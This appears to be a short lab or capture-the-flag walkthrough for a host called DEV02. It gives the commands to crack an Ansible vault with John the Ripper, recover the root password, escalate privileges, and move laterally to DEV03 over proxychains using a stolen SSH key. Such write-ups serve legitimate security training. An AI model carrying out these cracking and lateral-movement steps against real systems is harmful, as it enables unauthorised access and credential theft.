# DEV02 Privesc then lateral movement to DEV03

The file .root.enc in the HOME folder contains a Vault that can be cracked.  
1. Copy the file .root.enc onto your Kali
2. Put the content on one line, and convert it to a John format using `python3 /usr/share/john/ansible2john.py root.enc vault.hash`
3. Crack it using JtR: `john --wordlist=rockyou.txt vault.hash`
4. Go back on DEV02, decrypt the vault using `cat the_vault | ansible-vault decrypt`, put the recovered password from John
5. The output is the root/sudo password, privesc using `sudo su` (or `su`)
6. Connect to DEV03 using the SSH key of the Ansible user that you copy on your Kali: `proxychains ssh ansible@172.16.X.224 -i ansible_ssh_key`
